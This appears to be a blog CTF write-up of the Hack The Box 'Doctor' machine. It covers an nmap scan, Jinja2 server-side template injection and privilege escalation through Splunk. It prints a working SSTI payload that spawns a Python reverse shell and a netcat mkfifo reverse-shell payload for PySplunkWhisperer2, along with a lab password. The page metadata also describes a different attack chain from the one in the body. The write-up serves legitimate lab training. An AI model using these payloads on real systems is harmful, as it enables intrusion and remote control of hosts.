
<!DOCTYPE html>
<html lang="en">
<head>
    </script>
    <script type="text/javascript" src="lightgallery/lightbox.js"></script>
    <link rel="stylesheet" href="lightgallery/lightbox.css">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="preload" as="style" href="assets/css/post.css">
    <link rel="preload" as="style" href="assets/css/syntax.css">
    <link rel="stylesheet" href="assets/css/post.css">
    <link rel="stylesheet" href="assets/css/syntax.css">
    <link rel="preload" as="style" href="assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css">
    <link rel="preload" as="script" href="assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js">
    <link rel="stylesheet" href="assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" />
    <script src="assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script>
    <script src="assets/js/dist/toc.min.js" async></script>
    <meta name="description"
        content="Dumping the .git dir and bypassing the ssrf along with chaining it with the php-deserialization and php-memcache to get a rce then doing some ldapmodify to modify some users entries to get the shell as root........" />
    <meta property="og:title" content="Hackthebox doctor writeup" />
    <meta property="og:description"
        content="Dumping the .git dir and bypassing the ssrf along with chaining it with the php-deserialization and php-memcache to get a rce then doing some ldapmodify to modify some users entries to get the shell as root........" />
    <meta property="og:image" content="photos/Doctor.jpg" />
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@0xdedinfosec">
    <meta property="twitter:title" content="Hackthebox Doctor writeup">
    <meta name="twitter:creator" content="@0xdedinfosec">
    <meta name="twitter:description"
        content="Dumping the .git dir and bypassing the ssrf along with chaining it with the php-deserialization and php-memcache to get a rce then doing some ldapmodify to modify some users entries to get the shell as root........">
    <meta name="twitter:image" content="https://dedinfosec.tech">
    <title>DedInfoSec | Hackthebox Doctor writeup</title>
    <link rel="icon" href="photos/download2.png" type="image/icon">
    <meta name="generator" content="Jekyll v4.1.0" />
    <meta property="og:title" content="Hackthebox Doctor writeup" />
    <meta name="author" content="dedinfosec" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Introduction@Doctor:~$" />
    <meta property="og:description" content="Introduction@Doctor:~$" />
    <link rel="canonical" href="https://dedinfosec.tech" />
    <meta property="og:url" content="https://dedinfosec.tech" />
    <meta property="og:site_name" content="dedinfosec" />
    <meta property="og:type" content="article" />
    <meta property="article:published_time" content="2020-05-21T00:00:00+00:00" />
    <meta name="twitter:card" content="summary" />
    <meta property="twitter:title" content="Hackthebox Doctor writeup" />
    <meta name="twitter:site" content="@0xdedinfosec" />
    <meta name="twitter:creator" content="@dedinfosec" />
    <meta name="google-site-verification" content="UfGDXP7MiKxFhS_R1LKVTpk3Cf20Hj-53gHZJrOFXuA" />
    <script type="application/ld+json">
     {"@type":"BlogPosting","url":"https://dedinfosec.tech/Doctor/","headline":"Hackthebox Doctor writeup","dateModified":"2020-06-17T07:03:57+00:00","datePublished":"2020-05-21T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://dedinfosec.tech/Doctor/"},"author":{"@type":"Person","name":"dedinfosec"},"description":"Introduction@dedinfosec:~$","@context":"https://schema.org"}
</script>
    <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license -->
    <link rel="shortcut icon" href="assets/img/favicons/favicon.ico" type="image/x-icon">
    <link rel="icon" href="assets/img/favicons/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" href="assets/img/favicons/apple-icon.png">
    <link rel="apple-touch-icon" href="assets/img/favicons/apple-icon-precomposed.png">
    <link rel="apple-touch-icon" sizes="57x57" href="assets/img/favicons/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="assets/img/favicons/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="assets/img/favicons/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="assets/img/favicons/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="assets/img/favicons/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="assets/img/favicons/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="assets/img/favicons/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="assets/img/favicons/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/img/favicons/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192" href="assets/img/favicons/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="assets/img/favicons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="assets/img/favicons/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="assets/img/favicons/favicon-16x16.png">
    <link rel="manifest" href="assets/img/favicons/manifest.json">
    <meta name='msapplication-config' content='assets/img/favicons/browserconfig.xml'>
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="assets/img/favicons/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
    <link rel="preconnect" href="cdn.jsdelivr.net">
    <link rel="dns-prefetch" href="cdn.jsdelivr.net">
    <link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
        integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin>
    <link rel="preload" as="style"
        href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"
        integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
    <link rel="preload" as="style" href="assets/css/main.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
        integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"
        integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/css/main.css">
    <link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"
        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
    <link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js"
        integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"
        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
    <script>
        window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>');
    </script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js"
        integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous" async></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
        integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script>
    <script src="assets/js/dist/commons.js" async></script>
    <script src="assets/js/dist/timeago.min.js" async></script>
    <link rel="preload" as="style" href="assets/css/post.css">
    <link rel="preload" as="style" href="assets/css/syntax.css">
    <link rel="stylesheet" href="assets/css/post.css">
    <link rel="stylesheet" href="assets/css/syntax.css">
    <link rel="preload" as="style" href="assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css">
    <link rel="preload" as="script" href="assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js">
    <link rel="stylesheet" href="assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" />
    <script src="assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script>
    <script src="assets/js/dist/toc.min.js" async></script>
    <meta name="description"
        content="Dumping the .git dir and bypassing the ssrf along with chaining it with the php-deserialization and php-memcache to get a rce then doing some ldapmodify to modify some users entries to get the shell as root........" />
    <meta property="og:title" content="Hackthebox Doctor writeup" />
    <meta property="og:description"
        content="Dumping the .git dir and bypassing the ssrf along with chaining it with the php-deserialization and php-memcache to get a rce then doing some ldapmodify to modify some users entries to get the shell as root........" />
    <meta property="og:image" content="photos/Doctor.jpg" />
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@0xdedinfosec">
    <meta property="twitter:title" content="Hackthebox Doctor writeup">
    <meta name="twitter:creator" content="@0xdedinfosec">
    <meta name="twitter:description"
        content="Dumping the .git dir and bypassing the ssrf along with chaining it with the php-deserialization and php-memcache to get a rce then doing some ldapmodify to modify some users entries to get the shell as root........">
    <meta name="twitter:image" content="https://dedinfosec.tech/Doctor/">
    <script src="assets/js/dist/tooltip-loader.min.js" async></script>
</head>

<body data-spy="scroll" data-target="#toc">
    <div id="sidebar" class="d-flex flex-column">
        <div id="nav-wrapper">
            <div id="profile-wrapper" class="d-flex flex-column">
                <div id="avatar" class="d-flex justify-content-center">
                    <a href="/" alt="avatar">
                        <img src="photos/download2.png" alt="avatar">
                    </a>
                </div>
                <div class="profile-text mt-3">
                    <div id="site-title">
                        <a href="/htb/">DedInfoSec</a>
                    </div>
                    <div id="site-subtitle" class="font-italic">InfoSec/Cybersec Blog And Writeups</div>
                </div>
            </div>
            <ul class="nav flex-column">
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/htb/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i>
                        <span>HOME</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="#" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fab fa-donate ml-3 mr-3 unloaded"></i>
                        <span>DONATION-OSCP</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/categories/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i>
                        <span>CATEGORIES</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/TIMELINE/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i>
                        <span>TIMELINE</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/contact.php" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i>
                        <span>CONTACT-US</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/whoami.html" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i>
                        <span>WHOAMI</span>
                    </a>
                </li>
            </ul>
        </div>
        <div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4">
            <span id="mode-toggle-wrapper">
                <i class="mode-toggle fas fa-sun" light-mode-invisible></i>
                <i class="mode-toggle fas fa-moon" dark-mode-invisible></i>
                <script type="text/javascript">
                    class ModeToggle {
                        static get MODE_KEY() {
                            return "mode";
                        }
                        static get DARK_MODE() {
                            return "dark";
                        }
                        static get LIGHT_MODE() {
                            return "light";
                        }
                        constructor() {
                            if (this.mode != null) {
                                if (this.mode == ModeToggle.DARK_MODE) {
                                    if (!this.isDarkPrefer) {
                                        this.setDark();
                                    }
                                } else {
                                    if (this.isDarkPrefer) {
                                        this.setLight();
                                    }
                                }
                            }
                            var self = this;
                            /* always follow the system prefers */
                            this.sysDarkPrefers.addListener(function () {
                                if (self.mode != null) {
                                    if (self.mode == ModeToggle.DARK_MODE) {
                                        if (!self.isDarkPrefer) {
                                            self.setDark();
                                        }
                                    } else {
                                        if (self.isDarkPrefer) {
                                            self.setLight();
                                        }
                                    }
                                    self.clearMode();
                                }
                            });
                        }
                        /* constructor() */
                        setDark() {
                            $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
                            sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
                        }
                        setLight() {
                            $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
                            sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
                        }
                        clearMode() {
                            $('html').removeAttr(ModeToggle.MODE_KEY);
                            sessionStorage.removeItem(ModeToggle.MODE_KEY);
                        }
                        get sysDarkPrefers() {
                            return window.matchMedia("(prefers-color-scheme: dark)");
                        }
                        get isDarkPrefer() {
                            return true;
                        }
                        get mode() {
                            return sessionStorage.getItem(ModeToggle.MODE_KEY);
                        }
                        flipMode() {
                            if ((this.mode == null && this.isDarkPrefer) || this.mode == ModeToggle.DARK_MODE) {
                                this.setLight();
                            } else {
                                /* light mode or default-light */
                                this.setDark();
                            }
                        }
                    }
                    /* ModeToggle */
                    let toggle = new ModeToggle();
                    $(".mode-toggle").click(function () {
                        toggle.flipMode();
                    });
                </script>
            </span>
            <span class="icon-border"></span>
            <a href="https://www.hackthebox.eu/home/users/profile/262485" target="_blank">
                </i><i class="fas fa-cube"></i>
            </a>
            <a href="#">
                <i class="fab fa-github"></i>
            </a>
            <a href="#">
                <i class="fab fa-discord"></i>
            </a>
            <a href="#">
                <i class="fab fa-twitter"></i>
            </a>
            <a href="#">
                <i class="fab fa-linkedin"></i>
            </a>
        </div>
    </div>
    <div id="main-wrapper">
        <div id="topbar-wrapper" class="row justify-content-center topbar-down">
            <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
                <span id="breadcrumb">
                    <span>
                        <a href="/htb/">Posts </a>
                    </span>
                    <span>Hackthebox Doctor writeup</span>
                </span>
                <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>
                <div id="topbar-title" style="padding-right: 25%;">Post</div>
                <span id="search-cancel">Cancel</span>
            </div>
        </div>
        <div id="main">
            <div class="row">
                <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">
                    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
                        <h1 data-toc-skip>Hackthebox Doctor writeup</h1>
                        <div class="post-meta text-muted d-flex flex-column">
                            <div>
                                <span class="timeago" data-toggle="tooltip" data-placement="bottom"
                                    title="Thu, Sept 28, 2020, 12:00 AM +0000">
                                    sept 28, 2020 <i class="unloaded">2020-9-28T00:00:00+00:00</i>
                                </span>
                                on <a href='/categories/active/'>active</a>
                                , <a href='/categories/retired/'>retired</a>
                            </div>
                        </div>
                        <div class="post-content">
                            <img src="photos/Doctor.jpg">
                            <h1>Introduction@Doctor:~$</h1>
                            <table>
                                <thead>
                                    <tr>
                                        <th>Column
                                        <th>
                                            Details
                                <tbody>
                                    <tr>
                                        <td>Name
                                        <td>
                                            Doctor
                                    <tr>
                                        <td>IP
                                        <td>
                                            10.10.10.209
                                    <tr>
                                        <td>Points
                                        <td>
                                            20
                                    <tr>
                                        <td>Os
                                        <td>
                                            Linux
                                    <tr>
                                        <td>Difficulty
                                        <td>
                                            Easy
                                    <tr>
                                        <td>Creator
                                        <td>
                                            <a href="https://www.hackthebox.eu/home/users/profile/94858"
                                                target="_blank">egotisticalSW</a>
                                    <tr>
                                        <td>Out On
                                        <td>26 Sept 2020
                            </table>
                            <h1 id="summary">Summary</h1>
                            <ul>
                                <li>
                                    <code class="language-plaintext highlighter-rouge">Nmap</code>
                                    shows the 3 <strong>Ports</strong> open.
                                </li>
                                <li>
                                    Getting the subdomain<code
                                        class="language-plaintext highlighter-rouge">doctors.htb</code>
                                    on the web server.
                                </li>
                                <li>
                                    Ananlyzing the <strong>Server sided template injection</strong>
                                </li>
                                <li>
                                    Got shell as <code class="language-plaintext highlighter-rouge">web</code>
                                </li>
                                <li>
                                    Found <strong>Password</strong> of shaun
                                    in <code class="language-plaintext highlighter-rouge">apache2 logs</code>
                                </li>
                                <li>
                                    Geeting the exploit of <code
                                        class="language-plaintext highlighter-rouge">Splunk</code>
                                </li>
                                <li>
                                    Got shell as <code class="language-plaintext highlighter-rouge">root</code>
                                </li>
                                <li>Getting <code class="language-plaintext highlighter-rouge">root.txt</code></li>
                            </ul>
                            <h1 id="pwned">Pwned</h1>
                            <html>

                            <head>
				<link rel="stylesheet" type="text/css" href="asciinema-player.css" />

                            <body>
                                <asciinema-player src="doctor.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1"
                                    cols="150" rows="20"></asciinema-player>
                                <script src="asciinema-player.js"></script>
                                <h1 id="recon">Recon</h1>
                                <h2 id="nmap">Nmap</h2>
                                <div class="language-bash highlighter-rouge">
                                    <div class="highlight">
                                        <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

┌─[root@d3dsec]─[~/Desktop/HTB/Doctor]
└──╼ #<span class="k">cat nmap/result.nmap</span> 
# Nmap 7.80 scan initiated Sun Sep 27 08:19:05 2020 as: nmap <span class="nt">-sC -sV -oA </span>/result 10.10.10.209
Nmap scan report for 10.10.10.209
Host is up (0.28s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
<span class="nt">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span>
<span class="nt">80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))</span>
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
<span class="nt">8089/tcp open  ssl/http Splunkd httpd</span>
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
<span class="k">| ssl-cert: Subject</span> commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: <span class="nt">2020-09-06T15:57:27</span>
|_Not valid after:  <span class="nt">2023-09-06T15:57:27</span>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="c"># Nmap done at Sun Sep 27 08:20:15 2020 -- 1 IP address (1 host up) scanned in 70.71 seconds</span>
                                                                </pre>
                                                </table>
                                            </code>
                                    </div>
                                </div>
                                <p>
                                    So basically Three ports are opened <code
                                        class="language-plaintext highlighter-rouge">22:ssh</code>
                                    <code class="language-plaintext highlighter-rouge">80:http</code>
                                    and <code class="language-plaintext highlighter-rouge">8089:https</code>
                                </p>
                                <h2 id="port-80">Port-80</h2>
                                <p>
                                    There is a simple web page no links are <code class="language-plaintext highlighter-rouge">working</code>
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web.png
                                        alt="Port-80" />
                                </p>
                                <p>
                                    But we find one subdomain <code class="language-plaintext highlighter-rouge">doctors.htb</code>
                                    .
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web1.png
                                        alt="Port-80" />
                                </p>
                                <p>
                                    Let's add this to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.
                                    Now let's go to <code class="language-plaintext highlighter-rouge">doctors.htb</code>
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web2.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    Hmmm , a login page. Let's Try some<code
                                        class="language-plaintext highlighter-rouge">sql injection</code>
                                </p>
                                <p>
                                    But nothing is work. Lets <code class="language-plaintext highlighter-rouge">Registers</code> ourself and try to login then
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web3.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    So its show nothing, Lets check the<code class="language-plaintext highlighter-rouge">Source Code</code>
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web4.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    This seems to be some link<code
                                        class="language-plaintext highlighter-rouge">/archive</code>
                                    let's go to that page and see what's on that
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web5.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    Hmmm, <code class="language-plaintext highlighter-rouge">Blank</code> Page 
                                </p>
                                <p>
                                    Let's, try to submit a new <code class="language-plaintext highlighter-rouge">message</code>
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web6.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    Let's, try first simple html <code class="language-plaintext highlighter-rouge">H1</code> tag
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web7.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    It accept this <code class="language-plaintext highlighter-rouge">html</code> h1 tag but were we got the <code class="language-plaintext highlighter-rouge">response</code> of that.
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web8.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    Let's check on that <code
                                    class="language-plaintext highlighter-rouge">/archive</code>
                                    page .
                                </p>
                                <p>
                                    But still it's <code
                                    class="language-plaintext highlighter-rouge">blank</code>. Let's check the source code of that page.
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web9.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    Our response is there. But he <code class="language-plaintext highlighter-rouge">didn't</code> execute, Let's try to <code class="language-plaintext highlighter-rouge">modify</code> this html tag
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web10.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    let's try to post this. <code class="language-plaintext highlighter-rouge">Hope</code> it's work
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web11.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    <code class="language-plaintext highlighter-rouge">Boom</code> it's work, Let's Check the <code class="language-plaintext highlighter-rouge">source code</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web12.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    Now i Known what's to do next. this is vulnerable from <code class="language-plaintext highlighter-rouge">Server-Side Template Injection</code>
                                </p>
                                <p>
                                    I Found interesting <code class="language-plaintext highlighter-rouge">Article</code>
                                </p>
                                <blockquote>
                                    <code class="language-plaintext highlighter-rouge">Link</code> : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank">Templates Injections</a>
                                </blockquote>
                                <p>
                                    Let's try <code class="language-plaintext highlighter-rouge">Jinja2</code> Basic injection
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web13.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    First, We are using <code class="language-plaintext highlighter-rouge">{{7*'7'}}</code>. 
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web14.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    If this executed <code class="language-plaintext highlighter-rouge">successfully</code> so we will get the response of <code class="language-plaintext highlighter-rouge">7777777</code>
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web15.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    Boom it's executed successfuly. Now let's use <code class="language-plaintext highlighter-rouge">Exploit the SSTI by writing an evil config file</code> To Get the reverse shell.
                                </p>
                                <p>
                                    We are using this <code class="language-plaintext highlighter-rouge">exploit</code>
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web16.png
                                        alt="doctors.htb" />
                                </p>
                                <div class="language-bash highlighter-rouge">
                                    <div class="highlight">
                                        <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">
1
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

<span class="s2">{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.00.0\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}</span>
                                                                </pre>
                                                </table>
                                            </code>
                                    </div>
                                </div>
                                <p>
                                    Let's try to <code class="language-plaintext highlighter-rouge">post</code> that
                                </p>
                                <p>
                                    <img class="lozad" src=photos/web17.png
                                        alt="doctors.htb" />
                                </p>
                                <p>Let's go to the <code class="language-plaintext highlighter-rouge">/archive</code>Page But First start a netcat lisner on <code class="language-plaintext highlighter-rouge">9001</code> port</p>
                                <p>
                                    <img class="lozad" src=photos/web18.png
                                        alt="doctors.htb" />
                                </p>
                                <p>
                                    It's <code class="language-plaintext highlighter-rouge">reloding</code>, let's check our <code class="language-plaintext highlighter-rouge">netcat</code> lisner.
                                </p>
                                <p>
                                    <img class="lozad" src=photos/local.png
                                        alt="terminal" />
                                </p>
                                <p>
                                    Ahhh…We got the <code class="language-plaintext highlighter-rouge">shell</code> successfuly
                                </p>
                                <p>
                                    We are <code class="language-plaintext highlighter-rouge">Web</code>.
                                </p>
                                <div class="language-php highlighter-rouge">
                                    <div class="highlight">
                                        <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">1
2
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

<span class="na">web@doctor:~$ whoami</span>
<span class="nt">Web</span>
                                                                </pre>
                                                </table>
                                            </code>
                                    </div>
                                </div>

                                <p>
                                    Let's enumerate something to get <code
                                    class="language-plaintext highlighter-rouge">Privilege escalation</code>
                                </p>
                                <p>
                                    hmm, We find something interesting thing in <code
                                    class="language-plaintext highlighter-rouge">/var/log/apache2/</code>
                                </p>
                                <p>
                                    In the <code
                                    class="language-plaintext highlighter-rouge">/var/log/apache2/</code>
                                    directory there is a file called backup. Let's check there is any <code
                                    class="language-plaintext highlighter-rouge">password</code> or anything interesting in That.
                                </p>
                                <p>
                                    <img class="lozad" src=photos/local1.png
                                        alt="terminal" />
                                </p>
                                <p>
                                    Boom guys, we find password of <code
                                    class="language-plaintext highlighter-rouge">shaun</code>
                                </p>
                                <div class="language-php highlighter-rouge">
                                    <div class="highlight">
                                        <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">1
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

<span class="nt">Password = Guitar123</span>
                                                                </pre>
                                                </table>
                                            </code>
                                    </div>
                                </div>
                                <p>
                                    Now Let's <code
                                    class="language-plaintext highlighter-rouge">Change</code> our user to <code
                                    class="language-plaintext highlighter-rouge">shaun</code>.
                                </p>
                                <div class="language-php highlighter-rouge">
                                    <div class="highlight">
                                        <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">1
2
3
4
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

<span class="k">web@doctor:~$ su shaun</span>
<span class="na">Password: </span>
<span class="k">shaun@doctor:~$ whoami</span>
<span class="na">shaun</span>
                                                                </pre>
                                                </table>
                                            </code>
                                    </div>
                                </div>
                                <h2>Privilege escalation</h2>
                                <p>
                                    I run <code
                                    class="language-plaintext highlighter-rouge">LinPEAS</code> And Find Something <code
                                    class="language-plaintext highlighter-rouge">interesting</code>.
                                </p>
                                <blockquote>
                                    <p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"
                                            target="_blank">LinPEAS - Linux Privilege Escalation Awesome Script</a>
                                    </p>
                                </blockquote>
                                <p>
                                    <img class="lozad" src=photos/local2.png
                                        alt="terminal" />
                                </p>
                                <h2>PySplunkWhisperer2_remote.py</h2>
                                <blockquote>
                                    <p><a href="https://github.com/DaniloCaruso/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py"
                                            target="_blank">PySplunkWhisperer2_remote</a>
                                    </p>
                                </blockquote>
                                <p>
                                    After some guessing and brain farts i was able to run this <code
                                        class="language-plaintext highlighter-rouge">PySplunkWhisperer2_remote.py</code>
                                </p>
                                <div class="language-php highlighter-rouge">
                                    <div class="highlight">
                                        <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">
1
</pre>
                                                            <td class="rouge-code">
                                                                <pre>


<span class="k">python PySplunkWhisperer2_remote.py --lhost 10.10.XX.XX --host 10.10.10.209 --username shaun --password Guitar123 --payload '/bin/bash -c "rm /tmp/dedsec;mkfifo /tmp/dedsec;cat /tmp/dedsec|/bin/sh -i 2>&1|nc 10.10.XX.XX 5555 >/tmp/dedsec"'</span>

                                                                </pre>
                                                </table>
                                            </code>
                                    </div>
                                </div>
                                <p>
                                    <img class="lozad" src=photos/local3.png
                                        alt="terminal" />
                                </p>
                                <p>
                                    Let's check <code
                                    class="language-plaintext highlighter-rouge">dedsec</code> directory is <code
                                    class="language-plaintext highlighter-rouge">created</code> or not.
                                </p>
                                <p>
                                    <img class="lozad" src=photos/local4.png
                                        alt="terminal" />
                                </p>
                                <p>
                                    And we <code
                                    class="language-plaintext highlighter-rouge">pwned</code> it …….
